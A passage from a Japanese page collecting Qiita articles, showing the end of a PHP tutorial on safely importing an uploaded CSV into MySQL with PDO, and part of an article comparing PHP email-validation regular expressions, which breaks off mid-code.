<p>ここまでのチェックを行った後、仕上げに期待するカラム数と配列の要素数が一致するかどうかを調べます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">期待するカラム数が4の場合</span></div>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// カラム数が異なる無効なフォーマット</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Invalid column detected'</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="sqlモードを-traditional-に設定する" class="fragment"></span><a href="#sql%E3%83%A2%E3%83%BC%E3%83%89%E3%82%92-traditional-%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><strong>SQLモードを <code>TRADITIONAL</code> に設定する</strong>
</h2>

<p>こうすることで、不適切なデータが強引に適切な形に変換されて格納されようとしたときに、そうする代わりにSQLエラーを発生させてくれます。PDOのエラーモードを <strong><code>PDO::ERRMODE_EXCEPTION</code></strong> に設定しておくと、発生したSQLエラーが更にPDOExceptionとしてスローされるので、PDOとの相性は抜群とも言えるでしょう。</p>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SET</span> <span class="k">SESSION</span> <span class="n">sql_mode</span><span class="o">=</span><span class="s1">'TRADITIONAL'</span>
</pre></div></div>

<h1>
<span id="ソースコード" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a><strong>ソースコード</strong>
</h1>

<p>DSN、テーブル名、カラム数といった情報は適宜ご自分の環境に合わせて修正してください。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="cm">/* HTML特殊文字をエスケープする関数 */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// パラメータを正しい構造で受け取った時のみ実行</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_int</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]))</span> <span class="p">{</span>

    <span class="k">try</span> <span class="p">{</span>

        <span class="cm">/* ファイルアップロードエラーチェック */</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_OK</span><span class="o">:</span>
                <span class="c1">// エラー無し</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_NO_FILE</span><span class="o">:</span>
                <span class="c1">// ファイル未選択</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'File is not selected'</span><span class="p">);</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_INI_SIZE</span><span class="o">:</span>
            <span class="k">case</span> <span class="nx">UPLOAD_ERR_FORM_SIZE</span><span class="o">:</span>
                <span class="c1">// 許可サイズを超過</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'File is too large'</span><span class="p">);</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Unknown error'</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'upfile'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>
        <span class="nv">$detect_order</span> <span class="o">=</span> <span class="s1">'ASCII,JIS,UTF-8,CP51932,SJIS-win'</span><span class="p">;</span>
        <span class="nb">setlocale</span><span class="p">(</span><span class="nx">LC_ALL</span><span class="p">,</span> <span class="s1">'ja_JP.UTF-8'</span><span class="p">);</span>

        <span class="cm">/* 文字コードを変換してファイルを置換 */</span>
        <span class="nv">$buffer</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$encoding</span> <span class="o">=</span> <span class="nb">mb_detect_encoding</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="nv">$detect_order</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// 文字コードの自動判定に失敗</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Character set detection failed'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="nb">mb_convert_encoding</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">));</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$buffer</span><span class="p">);</span>

        <span class="cm">/* データベースに接続 */</span>
        <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span>
            <span class="s1">'mysql:dbname=test_db;host=localhost;charset=utf8'</span><span class="p">,</span>
            <span class="s1">'root'</span><span class="p">,</span>
            <span class="s1">''</span><span class="p">,</span>
            <span class="k">array</span><span class="p">(</span>
                <span class="c1">// カラム型に合わない値がINSERTされようとしたときSQLエラーとする</span>
                <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_INIT_COMMAND</span> <span class="o">=&gt;</span> <span class="s2">"SET SESSION sql_mode='TRADITIONAL'"</span><span class="p">,</span>
                <span class="c1">// SQLエラー発生時にPDOExceptionをスローさせる</span>
                <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">,</span>
                <span class="c1">// プリペアドステートメントのエミュレーションを無効化する</span>
                <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_EMULATE_PREPARES</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
            <span class="p">)</span>
        <span class="p">);</span>
        <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'INSERT INTO test_table VALUES (?, ?, ?, ?)'</span><span class="p">);</span>

        <span class="cm">/* トランザクション処理 */</span>
        <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">beginTransaction</span><span class="p">();</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">);</span>
            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">fgetcsv</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">===</span> <span class="k">array</span><span class="p">(</span><span class="k">null</span><span class="p">))</span> <span class="p">{</span>
                    <span class="c1">// 空行はスキップ</span>
                    <span class="k">continue</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
                    <span class="c1">// カラム数が異なる無効なフォーマット</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'Invalid column detected'</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="nv">$executed</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
                <span class="c1">// ファイルポインタが終端に達していなければエラー</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'CSV parsing error'</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">commit</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">rollBack</span><span class="p">();</span>
            <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="cm">/* 結果メッセージをセット */</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$executed</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// 1回以上実行された</span>
            <span class="nv">$msg</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'green'</span><span class="p">,</span> <span class="s1">'Import successful'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// 1回も実行されなかった</span>
            <span class="nv">$msg</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'black'</span><span class="p">,</span> <span class="s1">'There were nothing to import'</span><span class="p">);</span>
        <span class="p">}</span>

    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* エラーメッセージをセット */</span>
        <span class="nv">$msg</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'red'</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>

    <span class="p">}</span>

<span class="p">}</span>

<span class="c1">// XHTMLとしてブラウザに認識させる</span>
<span class="c1">// (IE8以下はサポート対象外ｗ)</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CSV to MySQL importation test<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$msg</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>Result<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">;"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">fieldset</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">legend</span><span class="p">&gt;</span>Select File<span class="p">&lt;/</span><span class="nt">legend</span><span class="p">&gt;</span>
      Filename(CSV is only supported): <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"upfile"</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Upload"</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">fieldset</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />11位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>128</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/257eabe0b43b1e02e6f7">PHPしか書けないザコがメールアドレス正規表現でガチ勢に挑んでみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-01 09:01:34</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Perl]</b> <b>[PHP]</b> <b>[正規表現]</b> <b>[IPv6]</b> <b>[セキュリティ]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>この記事の情報は古いので，最新の情報が欲しい方は <a href="http://qiita.com/mpyw/items/346f1789ad0e1b969ebc" id="reference-a9304e6cb9347ff9ed34">「PHPで各種バリデーション」</a> をお読みください。</p>

<h1>
<span id="関数ラインナップ" class="fragment"></span><a href="#%E9%96%A2%E6%95%B0%E3%83%A9%E3%82%A4%E3%83%B3%E3%83%8A%E3%83%83%E3%83%97"><i class="fa fa-link"></i></a>関数ラインナップ</h1>

<h2>
<span id="私の関数" class="fragment"></span><a href="#%E7%A7%81%E3%81%AE%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a>私の関数</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MyFunction</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">validate_email</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nv">$strict</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$dot_string</span> <span class="o">=</span> <span class="nv">$strict</span> <span class="o">?</span>
        <span class="s1">'(?:[A-Za-z0-9!#$%&amp;*+=?^_`{|}~\'\\/-]|(?&lt;!\\.|\\A)\\.(?!\\.|@))'</span> <span class="o">:</span>
        <span class="s1">'(?:[A-Za-z0-9!#$%&amp;*+=?^_`{|}~\'\\/.-])'</span>
    <span class="p">;</span>
    <span class="nv">$quoted_string</span> <span class="o">=</span> <span class="s1">'(?:\\\\\\\\|\\\\"|\\\\?[A-Za-z0-9!#$%&amp;*+=?^_`{|}~()&lt;&gt;[\\]:;@,. \'\\/-])'</span><span class="p">;</span>
    <span class="nv">$ipv4_part</span> <span class="o">=</span> <span class="s1">'(?:[0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])'</span><span class="p">;</span>
    <span class="nv">$ipv6_part</span> <span class="o">=</span> <span class="s1">'(?:[A-fa-f0-9]{1,4})'</span><span class="p">;</span>
    <span class="nv">$fqdn_part</span> <span class="o">=</span> <span class="s1">'(?:[A-Za-z](?:[A-Za-z0-9-]{0,61}?[A-Za-z0-9])?)'</span><span class="p">;</span>
    <span class="nv">$ipv4</span> <span class="o">=</span> <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv4_part</span><span class="si">}</span><span class="se">\\</span><span class="s2">.){3}</span><span class="si">{</span><span class="nv">$ipv4_part</span><span class="si">}</span><span class="s2">)"</span><span class="p">;</span>
    <span class="nv">$ipv6</span> <span class="o">=</span> <span class="s1">'(?:'</span> <span class="o">.</span>
        <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">:){7}(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> <span class="s1">'|'</span> <span class="o">.</span>
        <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">:){6}(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">|:</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> <span class="s1">'|'</span> <span class="o">.</span>
        <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">:){5}(?:(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){1,2}|:</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> <span class="s1">'|'</span> <span class="o">.</span>
        <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">:){4}(?:(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){1,3}|(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">)?:</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> <span class="s1">'|'</span> <span class="o">.</span>
        <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">:){3}(?:(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){1,4}|(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){0,2}:</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> <span class="s1">'|'</span> <span class="o">.</span>
        <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">:){2}(?:(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){1,5}|(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){0,3}:</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> <span class="s1">'|'</span> <span class="o">.</span>
        <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">:){1}(?:(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){1,6}|(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){0,4}:</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> <span class="s1">'|'</span> <span class="o">.</span>
        <span class="s2">"(?::(?:(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){1,7}|(?::</span><span class="si">{</span><span class="nv">$ipv6_part</span><span class="si">}</span><span class="s2">){0,5}:</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">|:))"</span> <span class="o">.</span> 
    <span class="s1">')'</span><span class="p">;</span>
    <span class="nv">$fqdn</span> <span class="o">=</span> <span class="s2">"(?:(?:</span><span class="si">{</span><span class="nv">$fqdn_part</span><span class="si">}</span><span class="se">\\</span><span class="s2">.)+?</span><span class="si">{</span><span class="nv">$fqdn_part</span><span class="si">}</span><span class="s2">)"</span><span class="p">;</span>
    <span class="nv">$local</span> <span class="o">=</span> <span class="s2">"(</span><span class="si">{</span><span class="nv">$dot_string</span><span class="si">}</span><span class="s2">++|(</span><span class="se">\"</span><span class="s2">)</span><span class="si">{</span><span class="nv">$quoted_string</span><span class="si">}</span><span class="s2">++</span><span class="se">\"</span><span class="s2">)"</span><span class="p">;</span>
    <span class="nv">$domain</span> <span class="o">=</span> <span class="s2">"(</span><span class="si">{</span><span class="nv">$fqdn</span><span class="si">}</span><span class="s2">|</span><span class="se">\\</span><span class="s2">[</span><span class="si">{</span><span class="nv">$ipv4</span><span class="si">}</span><span class="s2">]|</span><span class="se">\\</span><span class="s2">[</span><span class="si">{</span><span class="nv">$ipv6</span><span class="si">}</span><span class="s2">]|</span><span class="se">\\</span><span class="s2">[</span><span class="si">{</span><span class="nv">$fqdn</span><span class="si">}</span><span class="s2">])"</span><span class="p">;</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"/</span><span class="se">\\</span><span class="s2">A</span><span class="si">{</span><span class="nv">$local</span><span class="si">}</span><span class="s2">@</span><span class="si">{</span><span class="nv">$domain</span><span class="si">}</span><span class="se">\\</span><span class="s2">z/"</span><span class="p">;</span>
    <span class="k">return</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$email</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
        <span class="p">(</span>
            <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">66</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">256</span><span class="p">])</span> <span class="o">||</span>
            <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">64</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">254</span><span class="p">])</span>
        <span class="p">)</span>
    <span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<ul>
<li>通常のローカル部</li>
<li>ローカル部のクオート方式</li>
<li>IPv4</li>
<li>純正IPv6</li>
<li>IPv4混じりのIPv6</li>
</ul>

<p>以上全てに対応しました。<br>
<code>strict = false</code> にすると日本の古い携帯電話のアドレスも許容します。<br>
今回は割愛。</p>

<h2>
<span id="phpの-filter_var-関数" class="fragment"></span><a href="#php%E3%81%AE-filter_var-%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a>PHPの <code>filter_var</code> 関数</h2>

<p><strong>詳　細　不　明</strong></p>

<h2>
<span id="devachieve-和田さん" class="fragment"></span><a href="#devachieve-%E5%92%8C%E7%94%B0%E3%81%95%E3%82%93"><i class="fa fa-link"></i></a>DevAchieve (和田さん)</h2>

<p><a href="http://wada811.blogspot.com/2013/03/best-email-format-check-regex-in-php.html" class="autolink" rel="nofollow noopener" target="_blank">http://wada811.blogspot.com/2013/03/best-email-format-check-regex-in-php.html</a></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">DevAchieve'sFunction</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">isValidEmailFormat</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nv">$supportPeculiarFormat</span> <span class="o">=</span> <span class="k">true</span><span class="p">){</span>
    <span class="nv">$wsp</span>              <span class="o">=</span> <span class="s1">'[\x20\x09]'</span><span class="p">;</span> <span class="c1">// 半角空白と水平タブ</span>
    <span class="nv">$vchar</span>            <span class="o">=</span> <span class="s1">'[\x21-\x7e]'</span><span class="p">;</span> <span class="c1">// ASCIIコードの ! から ~ まで</span>
    <span class="nv">$quoted_pair</span>      <span class="o">=</span> <span class="s2">"</span><span class="se">\\\\</span><span class="s2">(?:</span><span class="si">{</span><span class="nv">$vchar</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="nv">$wsp</span><span class="si">}</span><span class="s2">)"</span><span class="p">;</span> <span class="c1">// \ を前につけた quoted-pair 形式なら \ と " が使用できる</span>
    <span class="nv">$qtext</span>            <span class="o">=</span> <span class="s1">'[\x21\x23-\x5b\x5d-\x7e]'</span><span class="p">;</span> <span class="c1">// $vchar から \ と " を抜いたもの。\x22 は " , \x5c は \</span>
    <span class="nv">$qcontent</span>         <span class="o">=</span> <span class="s2">"(?:</span><span class="si">{</span><span class="nv">$qtext</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="nv">$quoted_pair</span><span class="si">}</span><span class="s2">)"</span><span class="p">;</span> <span class="c1">// quoted-string 形式の条件分岐</span>
    <span class="nv">$quoted_string</span>    <span class="o">=</span> <span class="s2">"</span><span class="se">\"</span><span class="si">{</span><span class="nv">$qcontent</span><span class="si">}</span><span class="s2">+</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// " で 囲まれた quoted-string 形式。</span>
    <span class="nv">$atext</span>            <span class="o">=</span> <span class="s1">'[a-zA-Z0-9!#$%&amp;\'*+\-\/\=?^_`{|}~]'</span><span class="p">;</span> <span class="c1">// 通常、メールアドレスに使用出来る文字</span>
    <span class="nv">$dot_atom</span>         <span class="o">=</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$atext</span><span class="si">}</span><span class="s2">+(?:[.]</span><span class="si">{</span><span class="nv">$atext</span><span class="si">}</span><span class="s2">+)*"</span><span class="p">;</span> <span class="c1">// ドットが連続しない RFC 準拠形式をループ展開で構築</span>
    <span class="nv">$local_part</span>       <span class="o">=</span> <span class="s2">"(?:</span><span class="si">{</span><span class="nv">$dot_atom</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="nv">$quoted_string</span><span class="si">}</span><span class="s2">)"</span><span class="p">;</span> <span class="c1">// local-part は dot-atom 形式 または quoted-string 形式のどちらか</span>
    <span class="c1">// ドメイン部分の判定強化</span>
    <span class="nv">$alnum</span>            <span class="o">=</span> <span class="s1">'[a-zA-Z0-9]'</span><span class="p">;</span> <span class="c1">// domain は先頭英数字</span>
    <span class="nv">$sub_domain</span>       <span class="o">=</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$alnum</span><span class="si">}</span><span class="s2">+(?:-</span><span class="si">{</span><span class="nv">$alnum</span><span class="si">}</span><span class="s2">+)*"</span><span class="p">;</span> <span class="c1">// hyphenated alnum をループ展開で構築</span>
    <span class="nv">$domain</span>           <span class="o">=</span> <span class="s2">"(?:</span><span class="si">{</span><span class="nv">$sub_domain</span><span class="si">}</span><span class="s2">)+(?:[.](?:</span><span class="si">{</span><span class="nv">$sub_domain</span><span class="si">}</span><span class="s2">)+)+"</span><span class="p">;</span> <span class="c1">// ハイフンとドットが連続しないように $sub_domain をループ展開</span>
    <span class="nv">$addr_spec</span>        <span class="o">=</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$local_part</span><span class="si">}</span><span class="s2">[@]</span><span class="si">{</span><span class="nv">$domain</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// 合成</span>
    <span class="c1">// 昔の携帯電話メールアドレス用</span>
